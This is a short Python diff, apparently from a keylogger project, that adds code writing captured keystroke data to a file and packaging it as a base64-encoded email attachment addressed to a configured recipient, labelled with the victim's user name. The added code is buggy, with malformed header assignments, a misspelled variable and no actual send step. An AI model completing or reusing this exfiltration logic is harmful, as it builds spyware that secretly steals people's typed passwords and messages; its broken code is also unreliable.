@@ -84,9 +84,33 @@ def write_file(count):
         SECONDS = 60
 
         time.sleep(10)
+        
         while True:
             if len(logged_data) > 1:
-                pass
+                try:
+                    write_file(count)
+
+                    subject = f'[{user}] ~ {count}'
+
+                    msg = MIMEMultipart()
+                    msg = ['From'] = fromAddr
+                    msg = ['To'] = toAddr
+                    msg = ['subject'] = subject
+                    body = 'testing'
+                    msg.attach(MIMEText(body, 'plain'))
+
+                    attachment = open(delete_file[0], 'rb')
+
+                    filename = delete_filep[0].split('/')[2]
+
+                    part = MIMEBase('application','octect-stream')
+                    part.set_payload((attachment).read())
+                    encoders.encode_base64(part)
+                    part.add_header('content-disposition','attachment;filename='+str(filename))
+                    msg.attach(part)
+
+                    pass
+
 
 """temporary function to stop listening when esc is pressed"""
 def on_release(key):
